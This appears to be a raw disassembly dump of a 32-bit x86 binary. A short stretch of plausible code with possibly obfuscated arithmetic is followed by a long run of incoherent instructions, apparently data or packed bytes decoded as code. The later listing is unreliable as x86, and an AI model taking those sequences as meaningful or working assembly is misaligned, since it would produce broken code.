  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	call   0x381eb328
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x408260
  408275:	std    
  408276:	sub    al,0xe0
  408278:	fstp   TBYTE PTR [esi+0x4641242a]
  40827e:	push   es
  40827f:	rcr    DWORD PTR [ecx-0x2b],0x7c
  408283:	pop    ss
  408284:	test   edx,edx
  408286:	pop    ebp
  408287:	imul   DWORD PTR [ebp+0x1366a0ad]
  40828d:	ss dec ecx
  40828f:	xchg   DWORD PTR [edi+0x1f870275],ecx
  408295:	aas    
  408296:	sbb    ebx,esp
  408298:	xchg   ebx,eax
  408299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40829a:	adc    al,0xf6
  40829c:	push   ecx
  40829d:	data16 adc BYTE PTR [edi],bl
  4082a0:	ret    0xd897
  4082a3:	daa    
  4082a4:	fdiv   DWORD PTR [ecx-0x6]
  4082a7:	out    0xed,eax
  4082a9:	(bad)  
  4082aa:	or     eax,0x405c4025
  4082af:	and    bl,BYTE PTR [esi]
  4082b1:	in     al,dx
  4082b2:	dec    edx
  4082b3:	in     al,dx
  4082b4:	xchg   ebp,eax
  4082b5:	lods   eax,DWORD PTR ds:[esi]
  4082b6:	and    eax,eax
  4082b8:	cmp    dh,cl
  4082ba:	and    DWORD PTR [esi],edi
  4082bc:	imul   edx,DWORD PTR [edx+0xd],0xffffffdd
  4082c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082c1:	faddp  st(5),st
  4082c3:	jmp    0x724:0x172ee32a
  4082ca:	xor    cl,BYTE PTR [ebp-0x1e]
  4082cd:	scas   eax,DWORD PTR es:[edi]
  4082ce:	es cmp eax,eax
  4082d1:	into   
  4082d2:	xchg   edi,eax
  4082d3:	repnz mov eax,0xa65cc4ac
  4082d9:	push   ss
  4082da:	cli    
  4082db:	outs   dx,BYTE PTR ds:[esi]
  4082dc:	pop    es
  4082dd:	and    ebx,DWORD PTR [esi+0x6b]
  4082e0:	push   ebx
  4082e1:	mov    edx,0x4cadf3f5
  4082e6:	shl    BYTE PTR [edx-0x4f01dfdd],0xf9
  4082ed:	jge    0x4082fb
  4082ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082f0:	pop    edx
  4082f1:	jo     0x40828f
  4082f3:	ins    BYTE PTR es:[edi],dx
  4082f4:	jbe    0x4082ba
  4082f6:	jmp    0xf3ee1617
  4082fb:	mov    dh,0xb5
  4082fd:	jno    0x40837c
  4082ff:	lods   al,BYTE PTR ds:[esi]
  408300:	scas   eax,DWORD PTR es:[edi]
  408301:	sbb    DWORD PTR [esi],0x6f
  408304:	add    bl,BYTE PTR [eax]
  408306:	fld    st(5)
  408308:	shr    ebp,0xcb
  40830b:	inc    esp
  40830c:	xchg   edx,eax
  40830d:	icebp  
  40830e:	(bad)  
  40830f:	ror    DWORD PTR [ebx+0x5b1b8677],cl
  408315:	stc    
  408316:	sbb    BYTE PTR [edi-0x2f],0xe2
  40831a:	push   es
  40831b:	xchg   ecx,eax
  40831c:	mov    ds:0x2271ece4,eax
  408321:	in     eax,dx
  408322:	fwait
  408323:	sub    BYTE PTR [ebp+edi*8+0x144ef0c],dh
  40832a:	test   DWORD PTR [edi+0x42],edx
  40832d:	jns    0x408317
  40832f:	icebp  
  408330:	or     ah,BYTE PTR [eax+ebp*8-0x71becff8]
  408337:	cld    
  408338:	loope  0x408351
  40833a:	cld    
  40833b:	xchg   edx,eax
  40833c:	cli    
  40833d:	aam    0xec
  40833f:	dec    eax
  408340:	and    DWORD PTR [ecx],edi
  408342:	mov    cl,0xc5
  408344:	sbb    ebx,DWORD PTR [ebx]
  408346:	cmp    edx,ecx
  408348:	adc    DWORD PTR [ebp-0x4c],ebp
  40834b:	sahf   
  40834c:	cmc    
  40834d:	push   ss
  40834e:	cli    
  40834f:	dec    ecx
  408350:	jno    0x4083cb
  408352:	and    al,0x2c
  408354:	pop    ss
  408355:	and    DWORD PTR ds:0x6e7380ff,ebp
  40835b:	ins    DWORD PTR es:[edi],dx
  40835c:	aam    0x40
  40835e:	out    dx,al
  40835f:	in     al,dx
  408360:	inc    esp
  408361:	ret    0x267b
  408364:	jg     0x408353
  408366:	fs stos BYTE PTR es:[edi],al
  408368:	hlt    
  408369:	ins    BYTE PTR es:[edi],dx
  40836a:	push   esi
  40836b:	push   ss
  40836c:	or     al,0x6e
  40836e:	loope  0x4083d2
  408370:	inc    eax
  408371:	xor    DWORD PTR [ebp-0x1a1d4fa8],0xcec3524b
  40837b:	xchg   esp,eax
  40837c:	cmp    DWORD PTR [edi-0x4c],edi
  40837f:	push   ebp
  408380:	mov    esp,0xe92512e5
  408385:	into   
  408386:	aas    
  408387:	data16 jns 0x4083ed
  40838a:	stc    
  40838b:	in     eax,0xef
  40838d:	in     eax,dx
  40838e:	and    bl,BYTE PTR [esp+eax*2+0x70]
  408392:	dec    eax
  408393:	jae    0x408406
  408395:	imul   esi,esp,0x45
  408398:	sub    esp,DWORD PTR [eax]
  40839a:	fwait
  40839b:	inc    ecx
  40839c:	adc    al,0x83
  40839e:	ja     0x40840d
  4083a0:	lahf   
  4083a1:	shr    BYTE PTR cs:[eax+ecx*8+0x1],0xaf
  4083a7:	lock jp 0x408378
  4083aa:	loopne 0x4083e5
  4083ac:	xor    eax,0x13e06c49
  4083b1:	sub    DWORD PTR [ecx-0x75],ecx
  4083b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083b5:	xchg   BYTE PTR [ebp+0x4c165bc8],al
  4083bb:	popa   
  4083bc:	mov    dh,BYTE PTR [esi+0x6c4b744c]
  4083c2:	and    dl,BYTE PTR [edx+0x7cde1751]
  4083c8:	sub    eax,0x15be8cef
  4083cd:	push   es
  4083ce:	adc    BYTE PTR [ecx],bh
  4083d0:	and    eax,DWORD PTR [eax+0x30af554f]
  4083d6:	pusha  
  4083d7:	or     ch,dl
  4083d9:	inc    esp
  4083da:	pop    ecx
  4083db:	dec    ecx
  4083dc:	push   DWORD PTR [ebp+0x5f3e3731]
  4083e2:	mov    ebx,0xf681d8e1
  4083e7:	enter  0x9dfc,0xfa
  4083eb:	and    dl,BYTE PTR [eax-0x5d]
  4083ee:	inc    edi
  4083ef:	cmp    ch,BYTE PTR [ebp+0x2d]
  4083f2:	sub    edx,ebx
  4083f4:	loopne 0x4083e6
  4083f6:	xchg   ebp,eax
  4083f7:	inc    edx
  4083f8:	push   esi
  4083f9:	in     al,0xf9
  4083fb:	in     al,dx
  4083fc:	sbb    eax,0x9bd8cccf
  408401:	xor    eax,0xb54b97c
  408406:	test   DWORD PTR [edi+0x21],ebp
  408409:	in     al,dx
  40840a:	stc    
  40840b:	dec    esp
  40840c:	hlt    
  40840d:	test   DWORD PTR [ecx],0xaf50cf6b
  408413:	sti    
  408414:	add    DWORD PTR [edi],ecx
  408416:	sub    dl,bh
  408418:	mov    ecx,DWORD PTR [eax+0x75]
  40841b:	out    dx,eax
  40841c:	test   al,0x8e
  40841e:	push   ecx
  40841f:	dec    esi
  408420:	je     0x4083a6
  408422:	cld    
  408423:	add    BYTE PTR [ebx],dh
  408425:	push   cs
  408426:	into   
  408427:	xchg   ecx,eax
  408428:	push   edx
  408429:	mov    bl,0xac
  40842b:	loop   0x408489
  40842d:	std    
  40842e:	cs xor al,0x78
  408431:	jmp    0xc85f8868
  408436:	jnp    0x4083c2
  408438:	cmp    DWORD PTR [eax],esi
  40843a:	ds inc eax
  40843c:	pop    ebx
  40843d:	sbb    BYTE PTR [eax],0xa
  408440:	into   
  408441:	(bad)  
  408442:	mov    al,ds:0x9510ec31
  408447:	jns    0x40843e
  408449:	pop    eax
  40844a:	pop    ecx
  40844b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40844c:	push   esi
  40844d:	ret    
  40844e:	sub    bh,BYTE PTR [ecx+0x40075421]
  408454:	(bad)  
  408455:	cmp    ecx,DWORD PTR [eax-0x6b599a64]
  40845b:	xor    al,0x33
  40845d:	or     al,0xd0
  40845f:	stc    
  408460:	shl    eax,1
  408462:	shr    BYTE PTR [eax-0x18],cl
  408465:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408467:	inc    ecx
  408468:	sahf   
  408469:	ds xchg edi,eax
  40846b:	pop    es
  40846c:	cs sahf 
  40846e:	jp     0x4084d1
  408470:	mov    dl,0x74
  408472:	sub    esi,DWORD PTR [eax]
  408474:	add    eax,0x5239825e
  408479:	mov    ebp,0x94b14d1d
  40847e:	mov    cl,0x8c
  408480:	inc    edx
  408481:	xor    BYTE PTR [eax],bh
  408483:	fwait
  408484:	cmp    dh,BYTE PTR [edi+0x3bebf111]
  40848a:	push   edx
  40848b:	cmp    al,0x7c
  40848d:	inc    esi
  40848e:	or     al,0xbd
  408490:	jnp    0x4084fb
  408492:	and    al,0x88
  408494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408495:	dec    eax
  408496:	adc    al,0xd4
  408498:	test   al,0x3c
  40849a:	out    dx,eax
  40849b:	rcl    bh,0x43
  40849e:	in     al,dx
  40849f:	mov    cl,ah
  4084a1:	pcmpeqd mm6,QWORD PTR [esi-0x5b]
  4084a5:	xchg   ebx,eax
  4084a6:	dec    ebp
  4084a7:	jae    0x408507
  4084a9:	xchg   esi,eax
  4084aa:	leave  
  4084ab:	and    dh,BYTE PTR ds:[eax]
  4084ae:	or     DWORD PTR [edi+0x33],0xe69916d4
  4084b5:	or     ebx,DWORD PTR [ebx-0x4c]
  4084b8:	dec    edx
  4084b9:	aam    0x78
  4084bb:	js     0x408480
  4084bd:	popa   
  4084be:	jno    0x4084cc
  4084c0:	pop    esp
  4084c1:	mov    ds:0x119e4708,al
  4084c6:	cli    
  4084c7:	ret    
  4084c8:	mov    ch,0x9c
  4084ca:	sbb    al,0x7c
  4084cc:	xchg   BYTE PTR [ebx],ch
  4084ce:	or     DWORD PTR [esi+0xd],esp
  4084d1:	int    0x9a
  4084d3:	adc    al,0x87
  4084d5:	sub    al,BYTE PTR [ebx]
  4084d7:	shr    DWORD PTR [esi],0x94
  4084da:	jne    0x4084ec
  4084dc:	push   eax
  4084dd:	(bad)  
  4084de:	(bad)  
  4084df:	ins    DWORD PTR es:[edi],dx
  4084e0:	imul   DWORD PTR [ecx+eiz*2]
  4084e3:	imul   ebp,DWORD PTR [esi],0x7e
  4084e6:	loope  0x408531
  4084e8:	scas   eax,DWORD PTR es:[edi]
  4084e9:	cwde   
  4084ea:	fisubr WORD PTR [edx+0x2f05a91c]
  4084f0:	and    eax,0x7d0987d7
  4084f5:	mov    DWORD PTR [edx],esi
  4084f7:	pop    edx
  4084f8:	rcl    BYTE PTR [ebp+0x62946984],0xa0
  4084ff:	faddp  st(7),st
  408501:	dec    edi
  408502:	retf   
  408503:	in     eax,0x7b
  408505:	or     al,0xcd
  408507:	div    DWORD PTR [ebx+0x2da18353]
  40850d:	stos   BYTE PTR es:[edi],al
  40850e:	inc    ebx
  40850f:	dec    ebx
  408510:	js     0x40849e
  408512:	div    BYTE PTR [ebx-0x6a]
  408515:	mov    ch,0xd7
  408517:	adc    esi,eax
  408519:	inc    edx
  40851a:	stos   DWORD PTR es:[edi],eax
  40851b:	xchg   ecx,eax
  40851c:	adc    edi,ebx
  40851e:	rcl    ch,cl
  408520:	cld    
  408521:	ret    
  408522:	sbb    edi,eax
  408524:	dec    esp
  408525:	scas   eax,DWORD PTR es:[edi]
  408526:	mov    cl,0x66
  408528:	popf   
  408529:	adc    eax,0x665c7a06
  40852e:	jnp    0x408555
  408530:	and    BYTE PTR ds:[esi+0x5],dl
  408534:	mov    WORD PTR [esi],ss
  408536:	and    al,0x47
  408538:	cmp    al,0x1d
  40853a:	les    edx,FWORD PTR [eax]
  40853c:	and    BYTE PTR [ebx],bl
  40853e:	cmp    edx,DWORD PTR [esi+0x4f3e8667]
  408544:	outs   dx,BYTE PTR ds:[esi]
  408545:	dec    esi
  408546:	ins    BYTE PTR es:[edi],dx
  408547:	push   esi
  408548:	cwde   
  408549:	scas   eax,DWORD PTR es:[edi]
  40854a:	mov    edx,0xca65f6d
  40854f:	imul   ebx,ebx,0xf
  408552:	rcr    DWORD PTR [esi],0xa9
  408555:	ins    BYTE PTR es:[edi],dx
  408556:	jle    0x408528
  408558:	pop    ebp
  408559:	in     eax,dx
  40855a:	rol    BYTE PTR [ecx],cl
  40855c:	retf   
  40855d:	call   0x404dfcf2
  408562:	(bad)  
  408563:	mov    esp,0xf0326dd1
  408568:	jb     0x408547
  40856a:	test   DWORD PTR [ebp-0x19e2edd0],0xa72d6ed4
  408574:	xchg   dh,cl
  408576:	adc    dh,bl
  408578:	mov    bl,0xf2
  40857a:	sbb    BYTE PTR [eax-0x5c],bh
  40857d:	outs   dx,BYTE PTR ds:[esi]
  40857e:	frstor cs:[edi]
  408581:	(bad)  
  408582:	pop    ebx
  408583:	popf   
  408584:	mov    ah,0xc5
  408586:	dec    ecx
  408587:	pop    esp
  408588:	pop    ecx
  408589:	mov    bl,0xb1
  40858b:	imul   esi,ebx,0x67
  40858e:	stos   DWORD PTR es:[edi],eax
  40858f:	test   eax,0xc5e9dc3e
  408594:	dec    ecx
  408595:	xchg   edx,eax
  408596:	es ins BYTE PTR es:[edi],dx
  408598:	stc    
  408599:	push   esi
  40859a:	lods   eax,DWORD PTR ds:[esi]
  40859b:	xor    BYTE PTR [ebp+0x53],cl
  40859e:	xchg   ebx,eax
  40859f:	pop    ds
  4085a0:	pop    edi
  4085a1:	cmp    edx,DWORD PTR [edi-0x16fe77dc]
  4085a7:	dec    eax
  4085a8:	add    eax,DWORD PTR [eax]
  4085aa:	add    BYTE PTR [edi-0x6],al
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xf13818fc
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x40856f
  4085c4:	jp     0x4085d4
  4085c6:	and    edx,DWORD PTR [esi]
  4085c8:	push   es
  4085c9:	jnp    0x408615
  4085cb:	cwde   
  4085cc:	bound  esi,QWORD PTR ss:[edx+0x71480f9c]
  4085d3:	out    dx,al
  4085d4:	cli    
  4085d5:	lds    edx,FWORD PTR [edi+eax*4]
  4085d8:	sub    eax,0x5b5fc58
  4085dd:	in     al,dx
  4085de:	loope  0x4085fb
  4085e0:	inc    ebp
  4085e1:	jbe    0x40864a
  4085e3:	jnp    0x408572
  4085e5:	addr16 xor al,0xc
  4085e8:	mov    BYTE PTR [ebx],bl
  4085ea:	dec    eax
  4085eb:	inc    edx
  4085ec:	or     dh,bh
  4085ee:	inc    edx
  4085ef:	sub    ecx,ebp
  4085f1:	cmp    BYTE PTR [eax+eax*2+0x63],0xd6
  4085f6:	inc    edx
  4085f7:	addr16 (bad) 
  4085f9:	pop    esp
  4085fa:	dec    esi
  4085fb:	mov    esi,0xa701d996
  408600:	js     0x40860a
  408602:	ss in  eax,dx
  408604:	xor    BYTE PTR [edx+ebp*1+0x60207876],dl
  40860b:	sbb    eax,0x6d1bf038
  408610:	in     eax,0xec
  408612:	ds call 0x7156:0xa12b6d41
  40861a:	imul   edi,ecx,0x8fa5779a
  408620:	cmp    esi,ecx
  408622:	dec    ecx
  408623:	(bad)  
  408625:	dec    ebp
  408626:	in     al,dx
  408627:	mov    ebx,0xb4622532
  40862c:	int    0xdf
  40862e:	fadd   QWORD PTR [eax+0x64]
  408631:	push   eax
  408632:	je     0x408610
  408634:	mov    DWORD PTR [edi],ebp
  408636:	fsubr  QWORD PTR ds:0x87c599ac
  40863c:	pop    eax
  40863d:	aad    0xd0
  40863f:	jge    0x4086a8
  408641:	iret   
  408642:	jg     0x408685
  408644:	loopne 0x4085cb
  408646:	mov    bh,0x23
  408648:	mov    edx,DWORD PTR [edi+0x46]
  40864b:	pop    es
  40864c:	mov    ebp,0xbe67f520
  408651:	imul   eax,DWORD PTR [ecx-0x53],0x20
  408655:	(bad)  
  408656:	mov    ds:0x44fa611f,eax
  40865b:	loop   0x408638
  40865d:	fstp   QWORD PTR [edx+0x185f9e3a]
  408663:	pop    es
  408664:	sti    
  408665:	aas    
  408666:	out    dx,eax
  408667:	imul   BYTE PTR [esi+0x6f85fb0b]
  40866d:	into   
  40866e:	or     cl,bl
  408670:	xchg   ebx,eax
  408671:	fs xchg ebx,eax
  408673:	jl     0x40866a
  408675:	jne    0x4086e5
  408677:	out    0xb9,al
  408679:	pop    esi
  40867a:	mov    dh,0x9a
  40867c:	push   esi
  40867d:	jge    0x408682
  40867f:	dec    eax
  408680:	jp     0x408662
  408682:	sbb    DWORD PTR [ebp-0x4ad133a0],edx
  408688:	xchg   esi,eax
  408689:	push   es
  40868a:	shl    esi,1
  40868c:	sub    BYTE PTR [edi+0x512be0ad],al
  408692:	mov    dh,0x28
  408694:	mov    ds,WORD PTR [ecx+eiz*1-0x73]
  408698:	jb     0x408644
  40869a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40869b:	jle    0x408714
  40869d:	and    dl,dh
  40869f:	int3   
  4086a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086a2:	outs   dx,BYTE PTR ds:[esi]
  4086a3:	xor    al,0xa1
  4086a5:	aaa    
  4086a6:	mov    ds:0xafb68f6c,eax
  4086ab:	mov    ds:0x734fced6,al
  4086b0:	inc    esi
  4086b1:	int3   
  4086b2:	fstp   TBYTE PTR [esi+0x141742ea]
  4086b8:	fdivr  DWORD PTR [edi]
  4086ba:	fnstcw WORD PTR ds:0x918d33ef
  4086c0:	xor    al,BYTE PTR [edx+0x733c0bd4]
  4086c6:	and    BYTE PTR [esp+ebp*8],0x9a
  4086ca:	dec    ebp
  4086cb:	and    ah,BYTE PTR [ecx+0x2d64fbc1]
  4086d1:	add    ch,BYTE PTR [esi-0x758b9452]
  4086d7:	xor    eax,0x7d64c29c
  4086dc:	retf   0xd346
  4086df:	lea    esi,[esi-0x25]
  4086e2:	test   BYTE PTR [edx],0xa3
  4086e5:	scas   al,BYTE PTR es:[edi]
  4086e6:	pop    edx
  4086e7:	xchg   edi,eax
  4086e8:	inc    ebx
  4086e9:	ret    0xa10b
  4086ec:	mov    ds:0x3f0a224,al
  4086f2:	(bad)  
  4086f3:	hlt    
  4086f4:	imul   ebp,DWORD PTR [edi],0xb18efa8c
  4086fa:	clc    
  4086fb:	cwde   
  4086fc:	arpl   WORD PTR [edx+edx*1],sp
  4086ff:	pop    eax
  408700:	pop    edx
  408701:	mov    cl,bl
  408703:	xchg   edi,eax
  408704:	add    al,0x15
  408706:	je     0x4086aa
  408708:	nop
  408709:	aaa    
  40870a:	xchg   esi,eax
  40870b:	sahf   
  40870c:	push   edx
  40870d:	xchg   edx,eax
  40870e:	adc    al,0x4d
  408710:	xor    al,0x12
  408712:	loopne 0x408708
  408714:	push   cs
  408715:	out    0x3e,eax
  408717:	mov    al,ds:0xf04a4cb0
  40871c:	adc    eax,0xaea3bb7c
  408721:	xchg   DWORD PTR [edx-0x44dee293],edx
  408727:	out    dx,al
  408728:	pop    edx
  408729:	call   0x71fbe278
  40872e:	test   DWORD PTR [esi+0x6e],ebp
  408731:	sub    esp,0xffffffd0
  408734:	mov    esp,0xe5d0e350
  408739:	ss into 
  40873b:	xor    al,0x4c
  40873d:	jae    0x408725
  40873f:	repnz stc 
  408741:	or     eax,0x74a6f54f
  408746:	inc    ebx
  408747:	xchg   esp,eax
  408748:	xor    edx,DWORD PTR [ecx+0x75]
  40874b:	xor    al,0xf1
  40874d:	ret    0xaf6
  408750:	cmp    ebp,esp
  408752:	push   0x9401242e
  408757:	cwde   
  408758:	xor    DWORD PTR [ebx],edx
  40875a:	mov    ecx,0x15b24da5
  40875f:	ins    DWORD PTR es:[edi],dx
  408760:	sbb    bh,BYTE PTR [ebx]
  408762:	dec    edi
  408763:	dec    ebx
  408764:	or     cl,BYTE PTR [eax+eiz*4-0x7a]
  408768:	out    0x1c,al
  40876a:	pop    edi
  40876b:	in     al,0xe7
  40876d:	jo     0x408790
  40876f:	jge    0x4087aa
  408771:	scas   al,BYTE PTR es:[edi]
  408772:	lods   al,BYTE PTR ds:[esi]
  408773:	mov    esi,ecx
  408775:	(bad)  
  408776:	mov    al,0x46
  408778:	cmp    edx,eax
  40877a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40877b:	or     al,0x59
  40877d:	mov    al,ds:0x8bf6849d
  408782:	xor    eax,0x7d209585
  408787:	sub    DWORD PTR [eax-0x620f8dee],ecx
  40878d:	mov    WORD PTR [edi-0x4d4c6bc2],ss
  408793:	repz inc ebx
  408795:	mov    bl,0xb9
  408797:	pop    ds
  408798:	scas   eax,DWORD PTR es:[edi]
  408799:	push   edx
  40879a:	gs mov cl,ch
  40879d:	imul   ebp,DWORD PTR [edx],0xf19a2e19
  4087a3:	jbe    0x4087c4
  4087a5:	in     al,0x84
  4087a7:	dec    DWORD PTR [esi-0x49]
  4087aa:	aas    
  4087ab:	(bad)  [edx]
  4087ad:	daa    
  4087ae:	and    bh,BYTE PTR [ecx-0x4f]
  4087b1:	(bad)  
  4087b2:	es (bad) 
  4087b4:	adc    dl,BYTE PTR [edx+0x35]
  4087b7:	popa   
  4087b8:	or     eax,0x3f02962b
  4087bd:	sahf   
  4087be:	sbb    BYTE PTR [ebx+ecx*4+0xa],ah
  4087c2:	adc    BYTE PTR [edi],al
  4087c4:	loop   0x40877c
  4087c6:	mov    DWORD PTR [edx-0x36],edi
  4087c9:	and    eax,0x3b42778
  4087ce:	mov    ds:0x1d34abc2,al
  4087d3:	dec    eax
  4087d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087d5:	push   edi
  4087d6:	jb     0x4087ae
  4087d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087d9:	idiv   cl
  4087db:	addr16 xchg edi,eax
  4087dd:	or     DWORD PTR [ebx+ebp*8],esi
  4087e0:	push   esp
  4087e1:	inc    ebp
  4087e2:	jns    0x40884a
  4087e4:	test   DWORD PTR [eax],edi
  4087e6:	ficom  WORD PTR [edx+0x3a]
  4087e9:	push   ss
  4087ea:	and    eax,0xf6c3eeb3
  4087ef:	jnp    0x408824
  4087f1:	jge    0x4087f1
  4087f3:	sub    al,BYTE PTR [ecx]
  4087f5:	xor    eax,DWORD PTR [ecx+0x2d1f6c4e]
  4087fb:	sub    cl,BYTE PTR [edx-0x3c]
  4087fe:	pusha  
  4087ff:	pop    edx
  408800:	adc    bl,BYTE PTR [ebx-0x1f]
  408803:	fadd   DWORD PTR [esp+ebx*2]
  408806:	push   0xfffffff0
  408808:	sti    
  408809:	mov    ?,edi
  40880b:	push   esi
  40880c:	in     al,dx
  40880d:	mov    esi,0x802c2b11
  408812:	jae    0x40888a
  408814:	dec    esp
  408815:	int    0xd
  408817:	leave  
  408818:	(bad)  
  408819:	jo     0x4087c5
  40881b:	stos   DWORD PTR es:[edi],eax
  40881c:	push   ebp
  40881d:	pop    eax
  40881e:	ror    BYTE PTR [ebx+edx*4-0x457101d0],cl
  408825:	add    al,0xbf
  408827:	je     0x40888c
  408829:	mov    ?,WORD PTR [ebx-0x50]
  40882c:	inc    esp
  40882d:	jns    0x4088a5
  40882f:	popa   
  408830:	mov    al,0xbc
  408832:	mov    ebx,0xcc19c053
  408837:	dec    esp
  408838:	mov    eax,0xfb9eeaaa
  40883d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40883e:	mov    ch,0x72
  408840:	add    ch,BYTE PTR ds:0xadf357e
  408846:	adc    DWORD PTR [ebx],ebx
  408848:	dec    eax
  408849:	loope  0x408832
  40884b:	add    eax,0x556113b6
  408850:	rcr    cl,1
  408852:	jmp    FWORD PTR ds:0xbc4cb5e8
  408858:	popf   
  408859:	loop   0x4087fe
  40885b:	xor    al,BYTE PTR [edi+0xd]
  40885e:	mov    dh,0xb
  408860:	xor    al,0x7
  408862:	pop    edi
  408863:	into   
  408864:	mov    dl,0x47
  408866:	xor    al,0xd4
  408868:	imul   esp,edi,0xf1bc7e99
  40886e:	sub    BYTE PTR [ecx+eax*4+0x44277d5a],dl
  408875:	xor    eax,0x3449dfc3
  40887a:	mov    ebp,0xd75e2ee9
  40887f:	add    al,0x79
  408881:	ja     0x4088b9
  408883:	in     al,0x6a
  408885:	inc    BYTE PTR [edx+0x77e15322]
  40888b:	xchg   ecx,eax
  40888c:	sub    cl,BYTE PTR [ebx-0x4c]
  40888f:	xchg   ecx,eax
  408890:	out    dx,al
  408891:	mul    BYTE PTR [ebp-0x2741ae62]
  408897:	push   esi
  408898:	mov    ebp,0x5deaf62f
  40889d:	retf   
  40889e:	xchg   ebp,eax
  40889f:	loop   0x4088bb
  4088a1:	outs   dx,BYTE PTR ds:[esi]
  4088a2:	sub    BYTE PTR [ebp+0x72cad61d],0xf1
  4088a9:	push   ds
  4088aa:	or     BYTE PTR ds:0xa5cb6ce5,al
  4088b0:	mov    al,ds:0x84979f9c
  4088b5:	pop    edx
  4088b6:	pop    ds
  4088b7:	mov    eax,DWORD PTR [eax+0x5a]
  4088ba:	jp     0x40892b
  4088bc:	sub    eax,0x97d909f2
  4088c1:	ds push ss
  4088c3:	(bad)
  4088c6:	js     0x40893d
  4088c8:	mov    bl,0xcf
  4088ca:	sub    esi,eax
  4088cc:	call   0xcfb9:0xffd6f1cf
  4088d3:	push   ebp
  4088d4:	retf   
  4088d5:	in     eax,dx
  4088d6:	shl    BYTE PTR [eax],1
  4088d8:	cdq    
  4088d9:	sbb    BYTE PTR [edx],ah
  4088db:	push   edx
  4088dc:	sar    BYTE PTR [ebp+ebp*2+0x13c5cb22],0x71
  4088e4:	iret   
  4088e5:	add    DWORD PTR [eax],edi
  4088e7:	or     eax,0xf3d448a1
  4088ec:	retf   0xaa62
  4088ef:	pop    esi
  4088f0:	cmp    eax,0x458dff13
  4088f5:	clc    
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x58bca301],cl
  40890c:	add    BYTE PTR [eax-0x7b],ch
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x408966
  408918:	fs ds push 0x4c592186
  40891f:	jmp    0xe850b569
  408924:	fdiv   DWORD PTR [ecx]
  408926:	pop    ds
  408927:	in     eax,dx
  408928:	and    DWORD PTR [edx],0xf6883492
  40892e:	inc    esp
  40892f:	iret   
  408930:	cld    
  408931:	in     eax,dx
  408932:	mov    al,ds:0xda2e6765
  408937:	in     al,0x63
  408939:	fnstcw WORD PTR [edi+0x46]
  40893c:	out    0x9c,eax
  40893e:	call   0xefbe7c34
  408943:	cld    
  408944:	ins    DWORD PTR es:[edi],dx
  408945:	xor    eax,0xde346a4
  40894a:	pop    edx
  40894b:	ss fcomip st,st(6)
  40894e:	push   ss
  40894f:	add    ebx,DWORD PTR [ebx+0x38ca1005]
  408955:	cmc    
  408956:	div    DWORD PTR [eax-0x47]
  408959:	sbb    eax,0x32e1bdd5
  40895e:	sub    bl,BYTE PTR [esi-0x5ff51ddb]
  408964:	sub    BYTE PTR ds:0xe08f6e91,bl
  40896a:	mov    al,0xcb
  40896c:	fldenv [esi]
  40896e:	push   ecx
  40896f:	xor    DWORD PTR [esi],0x5abe9ec8
  408975:	retf   
  408976:	jl     0x408917
  408978:	push   edx
  408979:	xor    bl,BYTE PTR [edi+0x2d]
  40897c:	sub    esp,DWORD PTR [ebx+0x710c40ca]
  408982:	mov    BYTE PTR [eax+0x4b],dl
  408985:	adc    DWORD PTR [ebp+0x4c],eax
  408988:	lock and cl,BYTE PTR [ecx]
  40898b:	pop    ebp
  40898c:	cmp    ah,BYTE PTR [ecx+0x1c]
  40898f:	push   ebx
